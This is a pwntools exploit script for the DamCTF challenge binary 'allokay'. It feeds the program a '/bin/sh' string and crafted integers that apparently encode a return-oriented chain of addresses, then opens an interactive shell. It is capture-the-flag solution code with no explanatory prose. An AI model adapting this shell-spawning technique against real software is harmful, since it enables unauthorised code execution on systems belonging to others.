#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chals.damctf.xyz --port 32575 ./allokay
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./allokay')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chals.damctf.xyz'
port = int(args.PORT or 32575)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
tbreak get_input
tbreak win
b *0x0000000000400811
continue
c
c
c
c
c
c
c
c
c
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def in_number(i):
    # io.recvuntil("10:".format(i))
    io.sendline("+"+str(i))
    # io.interactive()

io.sendline(str(11)+"\a"+"/bin/sh\x00")#11
# io.interactive()
for i in range(5):
    in_number(str(i))

io.sendline("64424509445")
io.sendline("6")
io.sendline("42949672967")
io.sendline(str(0x0000000000400933))
# io.sendline(str(3414407389463668736))
io.sendline(str(0x6010a3))
io.sendline(str(0x0000000000400767))
io.sendline(str(29400045130965551))
# io.sendline(str(23))

io.interactive()



